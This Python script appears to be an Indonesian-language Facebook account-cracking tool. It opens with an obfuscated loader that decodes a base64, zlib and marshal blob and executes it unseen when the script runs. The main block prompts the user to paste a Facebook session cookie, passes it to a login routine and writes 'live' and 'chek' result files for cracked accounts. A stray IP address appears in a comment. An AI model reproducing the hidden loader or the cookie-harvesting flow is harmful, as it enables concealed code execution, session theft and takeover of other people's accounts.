_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxtVL1v3DYUJ6mPu5PPH4kNJCmMQkWXXpve7YGRBjGKfqQ9FHCKtLINgSfyZFkSeaGo2BbOk7N26trhPGbp3D+l4NChnTJn69RHnd2kRk9475Hv8cff755I/YVu/BywR2BvNsF9gRhi+CXYBYkQI3uo98pJbkLIFaTaBsdRhBmKCMOMvESRwxzmQnSZt4cGvnFpVc8ScgNtbdfusAaO4TnO8BzFQA4YMjZ+ImWe8QE2bl7n2YAYt+LFNHISmb9CqgOgv7dHFUuoYqMqUXQ2KifTT6eTkWUbzs5MN44zkek4tkxVS4+b1bZ6XUnwO6I8sO61qD/ANb9pdIxBGjomjPxEjp1zzJw5zn31q3aZq72Fz7w5viTMv4fuINa5gy4wRrrDum10Wc9G5rOg6Ja9c9KOV4qgXDl3MJo7ducFZv1LfIEX/UsEOfJu7tydu4tVm9drrM9WL8hi/W390nJssDXLIbowWrejZ0iELgLlt45v54H6HSP7QHXDVn9EgvywbPKtcfP+kdaz6sEIWkerLBlOacIn0PdhIstRCc2POsvXUEVbyyVxIVNZ63hSay1FsxkE+58chl/S7H74jBcA42Fz92BHZ7rgBw8/Gn782WDnYHQ1fW3b3AThOOVCS/bgxWvb/+bD/Q8Ow2/lkRTh01qkaR3u8QmsoOrtSjgHnZQKzUVqj0QmplK5ADb4pB5C3P/zl58Pw29kmonwMVdHoLW4H35NCypyKsLvIabhUymLKhyf0WYLdAPpbvvnwq/EC1pkrHnP5p7wClBHAPqOMho+kYLnVTbYjBzFnxsn5VrZk2JczU+18WYqE9oQxU1nmglGiyLyTmiu6yigdBbTKRUsU31ARL1WdQnS1Kqd++WZzUS+4hQojCtnXBjvRGWaG5efZjoK+GnCZzqTojLru1IIntjJ50pJNfCUb7dxEp5HfXoi82uLVoD6qluxwbS9LUtnD7jxCtsn274qbK8FwbdxF2+DdXEfni28AVfhLgpIHypN0F6aFjQeePZiCVryODZBHJeS1YUd9+P4eU2LZUX1LNm9f2n/K0DZD4599ZXVAKSkzYwHuI3/BzHdnSXTQ4t7Y1X/A1PrNG8=', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
if __name__=="__main__":
	try:
		kueh={"cookie":open("cookie").read().replace("\n","")}
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("my_info").read())
	except FileNotFoundError:
		from informasi import info as aapganteng_
		aapganteng_(kueh.get("cookie")).myinfo();restart()
	if os.path.exists("chek.txt"): pass
	else: open("chek.txt","a").close()
	if os.path.exists("live.txt"): pass
	else: open("live.txt","a").close()
	ngentod().menu()
		
		
### 112.215.235.208
"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""